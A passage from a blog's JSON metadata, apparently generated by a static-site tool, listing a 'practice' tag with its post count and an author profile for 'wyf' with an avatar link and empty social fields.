mins."},"categories":[],"tags":[{"name":"练习","slug":"练习","count":14,"path":"api/tags/练习.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}